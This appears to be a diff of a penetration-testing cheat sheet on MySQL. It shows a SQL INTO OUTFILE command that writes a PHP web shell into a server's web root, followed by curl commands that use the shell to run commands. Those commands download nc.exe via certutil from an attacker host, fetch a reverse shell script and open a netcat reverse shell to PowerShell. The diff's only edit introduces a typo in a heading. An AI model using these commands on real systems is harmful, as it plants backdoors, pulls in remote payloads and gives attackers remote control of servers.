@@ -31,12 +31,11 @@ On Windows - https://www.qualitestgroup.com/resources/knowledge-center/how-to-gu
 mysql -u root -p
 ```
 
-## into outfile Shell
+## i7nto outfile Shell
 ```sql
 -- PHP
 SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/wamp/www/shell.php';
 curl "http://$ip/shell.php?cmd=whoami"
-
 curl "http://$ip/shell.php?cmd=certutil+-urlcache+-f+http://$ip/nc.exe+nc.exe"
 curl "http://$ip/shell.php?cmd=wget+http://$ip/reverse_shell.sh"
 curl "http://127.0.0.1:8080/shell.php?cmd=nc.exe+$ip+4444+-e+powershell.exe"
